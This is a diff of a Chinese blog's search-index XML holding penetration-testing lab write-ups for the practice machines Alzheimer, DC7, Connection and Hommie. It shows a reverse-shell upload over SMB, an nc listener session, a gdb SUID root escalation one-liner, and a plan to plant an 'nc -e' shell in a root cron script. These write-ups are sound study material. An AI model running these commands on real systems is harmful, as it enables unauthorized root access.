@@ -6,32 +6,6 @@
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>HMV-Alzheimer</title>
-    <url>/posts/16384.html</url>
-    <content><![CDATA[<p>HMV-Alzheimer靶场复盘</p>
-<span id="more"></span>
-<p><img src="https://pic1.imgdb.cn/item/679a35f1d0e0a243d4f878cb.png"></p>
-<h1 id="Alzheimer"><a href="#Alzheimer" class="headerlink" title="Alzheimer"></a>Alzheimer</h1><h2 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h2><p> <img src="https://pic1.imgdb.cn/item/679a400bd0e0a243d4f87a4b.png"><br>三个端口  只有21端口现在是开放的  80和22都是有防火墙<br>先尝试能不能匿名登录ftp  然后上传反弹shell文件<br><img src="https://pic1.imgdb.cn/item/679a4010d0e0a243d4f87a4c.png"><br>发现有一个.secretnote.txt 下载到本地查看<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4d.png"><br>提示我们要用knock服务 按这个顺序发送请求包才能打开端口</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YAML"><figure class="iseeu highlight /yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">┌──(root㉿kakeru)-[~/alz]</span></span><br><span class="line"><span class="string">└─#</span> <span class="string">knock</span> <span class="string">-u</span> <span class="number">192.168</span><span class="number">.240</span><span class="number">.125</span> <span class="number">1000 </span><span class="number">2000 </span><span class="number">3000</span></span><br></pre></td></tr></table></figure></div>
-<p>但是敲门之后还是无法打开两个端口  查了wp  发现和橘墨大佬的问题一样 因为我修改过网卡，所以去修改靶机的knockd配置文件<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4e.png" alt="|500"><br><code>service knockd restart</code><br><img src="https://pic1.imgdb.cn/item/679a403ed0e0a243d4f87a59.png"><br>修改配置文件之后在knock就可以访问80端口了</p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a403fd0e0a243d4f87a5a.png"><br>提示密码存在一个.txt文件中  用户名是 medusa   并且给了一个摩丝密码 nothing<br>现在进行目录扫描<br><img src="https://pic1.imgdb.cn/item/679a4044d0e0a243d4f87a5b.png"><br>这里给了三个重定向的目录 一次访问试试</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/secret/</span></span><br><span class="line">Maybe my password is in this secret folder?</span><br><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/home/  </span></span><br><span class="line">Maybe my pass is at home!</span><br><span class="line">-medusa</span><br><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/admin/</span></span><br><span class="line"><span class="variable">&lt;html&gt;</span></span><br><span class="line"><span class="variable">&lt;head&gt;</span><span class="variable">&lt;title&gt;</span>403 Forbidden<span class="variable">&lt;/title&gt;</span><span class="variable">&lt;/head&gt;</span></span><br><span class="line"><span class="variable">&lt;body bgcolor=&quot;white&quot;&gt;</span></span><br><span class="line"><span class="variable">&lt;center&gt;</span><span class="variable">&lt;h1&gt;</span>403 Forbidden<span class="variable">&lt;/h1&gt;</span><span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;hr&gt;</span><span class="variable">&lt;center&gt;</span>nginx/1.14.2<span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;/body&gt;</span></span><br><span class="line"><span class="variable">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>提示密码在secret目录中 又在文件home中所以访问&#x2F;secret&#x2F;home&#x2F;</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/secret/home/</span></span><br><span class="line"></span><br><span class="line">Im trying a lot. Im sure <span class="keyword">that</span> i will recover <span class="keyword">my</span> pass!</span><br><span class="line"></span><br><span class="line">-medusa</span><br></pre></td></tr></table></figure></div>
-<p>还是没有直接的密码<br>没有思路查看wp后才知道密码藏在ftp里面 但是是在knock之后过的ftp中  这个老六。。。<br><img src="https://pic1.imgdb.cn/item/679a4045d0e0a243d4f87a5d.png"><br>这个就是medusa的密码<br><img src="https://pic1.imgdb.cn/item/679a4047d0e0a243d4f87a5e.png"><br>拿到shell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a407ed0e0a243d4f87a61.png"><br>发现有sudo命令  但是这个无法提权<br>继续查suid文件<br><img src="https://pic1.imgdb.cn/item/679a4083d0e0a243d4f87a64.png"><br>搜索都可以用capsh提权<br><img src="https://pic1.imgdb.cn/item/679a407fd0e0a243d4f87a62.png"><br><img src="https://pic1.imgdb.cn/item/679a4082d0e0a243d4f87a63.png"><br>拿到flag</p>
-<p>密码存在knock之后的ftp的文件中也太阴险了。。。</p>
-]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>hmv</category>
-      </categories>
-      <tags>
-        <tag>-渗透 -HMV</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DC1靶场复盘</title>
     <url>/posts/52872.html</url>
     <content><![CDATA[<p>vulnhub-DC1靶场复盘</p>
@@ -152,24 +126,30 @@
       </tags>
   </entry>
   <entry>
-    <title>DC7靶场复盘</title>
-    <url>/posts/51728.html</url>
-    <content><![CDATA[<p>vulnhub-DC7靶场复盘</p>
+    <title>HMV-Alzheimer</title>
+    <url>/posts/16384.html</url>
+    <content><![CDATA[<p>HMV-Alzheimer靶场复盘</p>
 <span id="more"></span>
-<p>最难的是最开始的信息收集 ！！！ 根据网站提示的到外部找信息 一下下面的D7user 去github找到<mark>敏感信息泄漏</mark></p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a17c7d0e0a243d4f87577.png" alt="|250"><br><img src="https://pic1.imgdb.cn/item/679a17c8d0e0a243d4f87578.png" alt="|400"><br>nmap -A扫描之后发现80端口下面的目录结构 并且看到http是用Drupal 这个软件支持的 （后面回用到</p>
-<h2 id="web-探测-信息收集"><a href="#web-探测-信息收集" class="headerlink" title="web 探测 + 信息收集"></a>web 探测 + 信息收集</h2><p>用dirsearch跑一下目录 也没有发现什么有用的网页<br>页面上有一个搜索框 用sqlmap尝试发现没有注入点<br><img src="https://pic1.imgdb.cn/item/679a17c8d0e0a243d4f87579.png"><br>网站首页提示了用目录爆破不会成功 去外面找信息 –&gt; github<br><img src="https://pic1.imgdb.cn/item/679a17c9d0e0a243d4f8757a.png" alt="|425"><br>在github成功找到了这个用户<br><img src="https://pic1.imgdb.cn/item/679a17c9d0e0a243d4f8757b.png" alt="|450"><br>在config.php 中找到了用户名和密码 尝试在网站登录  失败  我们就登录ssh  拿到shell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a1814d0e0a243d4f8758a.png" alt="|575"><br>发现有一个叫做mbox的文件 里面是root发送的 并且好像每十五分钟发送一次<br>看一下这里的sh里有什么内容</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">cat</span> /opt/scripts/backups.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line"><span class="built_in">chown</span> dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.tar.gz</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/mail/dc7user</span><br></pre></td></tr></table></figure></div>
-<p>这里看到有用到drush这个服务<br><img src="https://pic1.imgdb.cn/item/679a1815d0e0a243d4f8758e.png"><br>而且可以看到这个文件的属主是root  只有www-data这个用户可以写入 我们只有一个读权限<br>现在我们的目标就是把root的shell用nc -e 反弹到本机  就是把这个语句写到这个脚本里面让他执行<br>现在的目的就是如何拿到www-data的shell   <mark>用drush</mark><br>根据搜索的知识 drush一般要在站点所在的目录下操作<br><code>cd /var/www/html     drush user-information admin </code><br> 可以查到管理的信息<br>然后再修改管理的密码 登录到web里面<br><img src="https://pic1.imgdb.cn/item/679a1816d0e0a243d4f87590.png" alt="|475"><br>但是发现这里和上一个靶机不一样 没有php的选项    搜索资料知道可以去下载插件<br>在网页上用php代码 写上反弹shell<br>现在就是用这个www用户把反弹shell语句写到刚才的那个脚本中  然后等到十五分的时候自动执行<br>完成！！ </p>
+<p><img src="https://pic1.imgdb.cn/item/679a35f1d0e0a243d4f878cb.png"></p>
+<h1 id="Alzheimer"><a href="#Alzheimer" class="headerlink" title="Alzheimer"></a>Alzheimer</h1><h2 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h2><p> <img src="https://pic1.imgdb.cn/item/679a400bd0e0a243d4f87a4b.png"><br>三个端口  只有21端口现在是开放的  80和22都是有防火墙<br>先尝试能不能匿名登录ftp  然后上传反弹shell文件<br><img src="https://pic1.imgdb.cn/item/679a4010d0e0a243d4f87a4c.png"><br>发现有一个.secretnote.txt 下载到本地查看<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4d.png"><br>提示我们要用knock服务 按这个顺序发送请求包才能打开端口</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YAML"><figure class="iseeu highlight /yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">┌──(root㉿kakeru)-[~/alz]</span></span><br><span class="line"><span class="string">└─#</span> <span class="string">knock</span> <span class="string">-u</span> <span class="number">192.168</span><span class="number">.240</span><span class="number">.125</span> <span class="number">1000 </span><span class="number">2000 </span><span class="number">3000</span></span><br></pre></td></tr></table></figure></div>
+<p>但是敲门之后还是无法打开两个端口  查了wp  发现和橘墨大佬的问题一样 因为我修改过网卡，所以去修改靶机的knockd配置文件<br><img src="https://pic1.imgdb.cn/item/679a4014d0e0a243d4f87a4e.png" alt="|500"><br><code>service knockd restart</code><br><img src="https://pic1.imgdb.cn/item/679a403ed0e0a243d4f87a59.png"><br>修改配置文件之后在knock就可以访问80端口了</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a403fd0e0a243d4f87a5a.png"><br>提示密码存在一个.txt文件中  用户名是 medusa   并且给了一个摩丝密码 nothing<br>现在进行目录扫描<br><img src="https://pic1.imgdb.cn/item/679a4044d0e0a243d4f87a5b.png"><br>这里给了三个重定向的目录 一次访问试试</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/secret/</span></span><br><span class="line">Maybe my password is in this secret folder?</span><br><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/home/  </span></span><br><span class="line">Maybe my pass is at home!</span><br><span class="line">-medusa</span><br><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/admin/</span></span><br><span class="line"><span class="variable">&lt;html&gt;</span></span><br><span class="line"><span class="variable">&lt;head&gt;</span><span class="variable">&lt;title&gt;</span>403 Forbidden<span class="variable">&lt;/title&gt;</span><span class="variable">&lt;/head&gt;</span></span><br><span class="line"><span class="variable">&lt;body bgcolor=&quot;white&quot;&gt;</span></span><br><span class="line"><span class="variable">&lt;center&gt;</span><span class="variable">&lt;h1&gt;</span>403 Forbidden<span class="variable">&lt;/h1&gt;</span><span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;hr&gt;</span><span class="variable">&lt;center&gt;</span>nginx/1.14.2<span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;/body&gt;</span></span><br><span class="line"><span class="variable">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>提示密码在secret目录中 又在文件home中所以访问&#x2F;secret&#x2F;home&#x2F;</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/secret/home/</span></span><br><span class="line"></span><br><span class="line">Im trying a lot. Im sure <span class="keyword">that</span> i will recover <span class="keyword">my</span> pass!</span><br><span class="line"></span><br><span class="line">-medusa</span><br></pre></td></tr></table></figure></div>
+<p>还是没有直接的密码<br>没有思路查看wp后才知道密码藏在ftp里面 但是是在knock之后过的ftp中  这个老六。。。<br><img src="https://pic1.imgdb.cn/item/679a4045d0e0a243d4f87a5d.png"><br>这个就是medusa的密码<br><img src="https://pic1.imgdb.cn/item/679a4047d0e0a243d4f87a5e.png"><br>拿到shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a407ed0e0a243d4f87a61.png"><br>发现有sudo命令  但是这个无法提权<br>继续查suid文件<br><img src="https://pic1.imgdb.cn/item/679a4083d0e0a243d4f87a64.png"><br>搜索都可以用capsh提权<br><img src="https://pic1.imgdb.cn/item/679a407fd0e0a243d4f87a62.png"><br><img src="https://pic1.imgdb.cn/item/679a4082d0e0a243d4f87a63.png"><br>拿到flag</p>
+<p>密码存在knock之后的ftp的文件中也太阴险了。。。</p>
 ]]></content>
       <categories>
         <category>靶场</category>
-        <category>vulnhub</category>
+        <category>hmv</category>
       </categories>
       <tags>
         <tag>渗透</tag>
-        <tag>vulnhub</tag>
+        <tag>HMV</tag>
       </tags>
   </entry>
   <entry>
@@ -210,6 +190,29 @@
       </tags>
   </entry>
   <entry>
+    <title>HMV-Connection</title>
+    <url>/posts/10052.html</url>
+    <content><![CDATA[<p>HMV-Connection靶场复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/679a35f7d0e0a243d4f878cd.png"></p>
+<h1 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h1><p>无法获取ip 在开始之前要先进入拯救者模式中修改 网卡信息</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a3d3bd0e0a243d4f879fa.png" alt="|750"><br>端口有4个  有http  ssh 还有smb服务 这个服务刚学到 是一个文件共享的服务 </p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里主要先考虑http和22端口<br>用dirsearch发现没有其他有用的界面   80端口是一个默认的index界面没有有用的信息<br>ssh 也不能直接登录上去  需要密码<br>所以考虑这个smb服务<br>用enum4linux -S 列举出smb共享资源<br><img src="https://pic1.imgdb.cn/item/679a3d40d0e0a243d4f879fb.png"><br>登录到share    – 利用smbclient  -N  匿名登录  <code>smbclient -N \\\\192.168.240.237\\share</code><br>这里要用反斜杠转义<br><img src="https://pic1.imgdb.cn/item/679a3d43d0e0a243d4f879fe.png"><br>登录进来之后也只看到只有一个html文件     然后我们从本地上传一个反弹shell的文件<br><code>put php-reverse-shell.php</code>  因为share这个文件夹只有只读权限所以进到html中上传<br>上传成功后 在本地监听  web端进入这个php文件  然后就可以获得shell</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/connections]</span><br><span class="line">└─# nc -lp 1234</span><br><span class="line">Linux<span class="built_in"> connection </span>4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br><span class="line"> 07:18:55 up 23 min,  0 users,  load average: 0.00, 0.00, 0.00<span class="built_in"></span></span><br><span class="line"><span class="built_in">USER </span>    TTY      <span class="keyword">FROM</span>             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ clear</span></span><br><span class="line"><span class="string">TERM environment variable not set.</span></span><br><span class="line"><span class="string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="string">&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用suid提权<br><img src="https://pic1.imgdb.cn/item/679a3d43d0e0a243d4f879ff.png" alt="|500"><br>这里使用gdb提权<br>在<a href="https://gtfobins.github.io/gtfobins/gdb/">gtfobins</a> 中找到提权方案</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line"><span class="symbol">/usr/bin/gdb</span> <span class="operator">-</span>nx <span class="operator">-</span>ex &#x27;python <span class="built_in">import</span> os; os.execl(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-p&quot;</span>)&#x27; <span class="operator">-</span>ex quit</span><br></pre></td></tr></table></figure></div>
+<p>拿到root权限<br>分别在&#x2F;root 和&#x2F;home&#x2F;connection 中找到flag</p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>hmv</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>HMV</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HMV-Baseme</title>
     <url>/posts/46022.html</url>
     <content><![CDATA[<p>HMV-Baseme靶场复盘</p>
@@ -232,84 +235,29 @@
         <category>hmv</category>
       </categories>
       <tags>
-        <tag>-渗透 -HMV</tag>
+        <tag>渗透</tag>
+        <tag>HMV</tag>
       </tags>
   </entry>
   <entry>
-    <title>HMV-Connection</title>
-    <url>/posts/10052.html</url>
-    <content><![CDATA[<p>HMV-Connection靶场复盘</p>
+    <title>DC7靶场复盘</title>
+    <url>/posts/51728.html</url>
+    <content><![CDATA[<p>vulnhub-DC7靶场复盘</p>
 <span id="more"></span>
-<p><img src="https://pic1.imgdb.cn/item/679a35f7d0e0a243d4f878cd.png"></p>
-<h1 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h1><p>无法获取ip 在开始之前要先进入拯救者模式中修改 网卡信息</p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a3d3bd0e0a243d4f879fa.png" alt="|750"><br>端口有4个  有http  ssh 还有smb服务 这个服务刚学到 是一个文件共享的服务 </p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里主要先考虑http和22端口<br>用dirsearch发现没有其他有用的界面   80端口是一个默认的index界面没有有用的信息<br>ssh 也不能直接登录上去  需要密码<br>所以考虑这个smb服务<br>用enum4linux -S 列举出smb共享资源<br><img src="https://pic1.imgdb.cn/item/679a3d40d0e0a243d4f879fb.png"><br>登录到share    – 利用smbclient  -N  匿名登录  <code>smbclient -N \\\\192.168.240.237\\share</code><br>这里要用反斜杠转义<br><img src="https://pic1.imgdb.cn/item/679a3d43d0e0a243d4f879fe.png"><br>登录进来之后也只看到只有一个html文件     然后我们从本地上传一个反弹shell的文件<br><code>put php-reverse-shell.php</code>  因为share这个文件夹只有只读权限所以进到html中上传<br>上传成功后 在本地监听  web端进入这个php文件  然后就可以获得shell</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/connections]</span><br><span class="line">└─# nc -lp 1234</span><br><span class="line">Linux<span class="built_in"> connection </span>4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br><span class="line"> 07:18:55 up 23 min,  0 users,  load average: 0.00, 0.00, 0.00<span class="built_in"></span></span><br><span class="line"><span class="built_in">USER </span>    TTY      <span class="keyword">FROM</span>             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ clear</span></span><br><span class="line"><span class="string">TERM environment variable not set.</span></span><br><span class="line"><span class="string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="string">&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用suid提权<br><img src="https://pic1.imgdb.cn/item/679a3d43d0e0a243d4f879ff.png" alt="|500"><br>这里使用gdb提权<br>在<a href="https://gtfobins.github.io/gtfobins/gdb/">gtfobins</a> 中找到提权方案</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line"><span class="symbol">/usr/bin/gdb</span> <span class="operator">-</span>nx <span class="operator">-</span>ex &#x27;python <span class="built_in">import</span> os; os.execl(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-p&quot;</span>)&#x27; <span class="operator">-</span>ex quit</span><br></pre></td></tr></table></figure></div>
-<p>拿到root权限<br>分别在&#x2F;root 和&#x2F;home&#x2F;connection 中找到flag</p>
+<p>最难的是最开始的信息收集 ！！！ 根据网站提示的到外部找信息 一下下面的D7user 去github找到<mark>敏感信息泄漏</mark></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a17c7d0e0a243d4f87577.png" alt="|250"><br><img src="https://pic1.imgdb.cn/item/679a17c8d0e0a243d4f87578.png" alt="|400"><br>nmap -A扫描之后发现80端口下面的目录结构 并且看到http是用Drupal 这个软件支持的 （后面回用到</p>
+<h2 id="web-探测-信息收集"><a href="#web-探测-信息收集" class="headerlink" title="web 探测 + 信息收集"></a>web 探测 + 信息收集</h2><p>用dirsearch跑一下目录 也没有发现什么有用的网页<br>页面上有一个搜索框 用sqlmap尝试发现没有注入点<br><img src="https://pic1.imgdb.cn/item/679a17c8d0e0a243d4f87579.png"><br>网站首页提示了用目录爆破不会成功 去外面找信息 –&gt; github<br><img src="https://pic1.imgdb.cn/item/679a17c9d0e0a243d4f8757a.png" alt="|425"><br>在github成功找到了这个用户<br><img src="https://pic1.imgdb.cn/item/679a17c9d0e0a243d4f8757b.png" alt="|450"><br>在config.php 中找到了用户名和密码 尝试在网站登录  失败  我们就登录ssh  拿到shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a1814d0e0a243d4f8758a.png" alt="|575"><br>发现有一个叫做mbox的文件 里面是root发送的 并且好像每十五分钟发送一次<br>看一下这里的sh里有什么内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">cat</span> /opt/scripts/backups.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line"><span class="built_in">chown</span> dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.tar.gz</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/mail/dc7user</span><br></pre></td></tr></table></figure></div>
+<p>这里看到有用到drush这个服务<br><img src="https://pic1.imgdb.cn/item/679a1815d0e0a243d4f8758e.png"><br>而且可以看到这个文件的属主是root  只有www-data这个用户可以写入 我们只有一个读权限<br>现在我们的目标就是把root的shell用nc -e 反弹到本机  就是把这个语句写到这个脚本里面让他执行<br>现在的目的就是如何拿到www-data的shell   <mark>用drush</mark><br>根据搜索的知识 drush一般要在站点所在的目录下操作<br><code>cd /var/www/html     drush user-information admin </code><br> 可以查到管理的信息<br>然后再修改管理的密码 登录到web里面<br><img src="https://pic1.imgdb.cn/item/679a1816d0e0a243d4f87590.png" alt="|475"><br>但是发现这里和上一个靶机不一样 没有php的选项    搜索资料知道可以去下载插件<br>在网页上用php代码 写上反弹shell<br>现在就是用这个www用户把反弹shell语句写到刚才的那个脚本中  然后等到十五分的时候自动执行<br>完成！！ </p>
 ]]></content>
       <categories>
         <category>靶场</category>
-        <category>hmv</category>
+        <category>vulnhub</category>
       </categories>
       <tags>
-        <tag>-渗透 -HMV</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HMV-Hommie</title>
-    <url>/posts/61994.html</url>
-    <content><![CDATA[<p>HMV-Hommie靶场复盘</p>
-<span id="more"></span>
-<p><img src="https://pic1.imgdb.cn/item/679a35f8d0e0a243d4f878cf.png"></p>
-<h1 id="Hommie"><a href="#Hommie" class="headerlink" title="Hommie"></a>Hommie</h1><h2 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h2><p><img src="https://pic1.imgdb.cn/item/679a3ec2d0e0a243d4f87a20.png" alt="|700"><br>发现有三个端口  ftp ssh http<br>先看看ftp能不能匿名登录<br><img src="https://pic1.imgdb.cn/item/679a3ec6d0e0a243d4f87a21.png" alt="|550"><br>尝试把反弹shell文件上传  无法得到shell<br>80端口<br><img src="https://pic1.imgdb.cn/item/679a3ec8d0e0a243d4f87a22.png"><br>得到两个用户 alexia nobody   并且提示我们要得到alexia的id_rsa<br>目录扫描<br><img src="https://pic1.imgdb.cn/item/679a3eccd0e0a243d4f87a23.png"><br><img src="https://pic1.imgdb.cn/item/679a3ed0d0e0a243d4f87a24.png"><br>使用了两个常用的目录字典都没有扫描到 说明大概率就是没有其他目录<br>web如果没有信息就说明信息收集还不过     – 重新用nmap扫描  看看有没有其他服务<br> <img src="https://pic1.imgdb.cn/item/679a3ef9d0e0a243d4f87a28.png"><br> 有新的发现  还有开放dhcpc tftp 服务<br> 根据前面的提示  get id_rsa  成功得到rsa私钥  登录到ssh<br> <img src="https://pic1.imgdb.cn/item/679a3f04d0e0a243d4f87a2d.png"><br> 成功拿到shell</p>
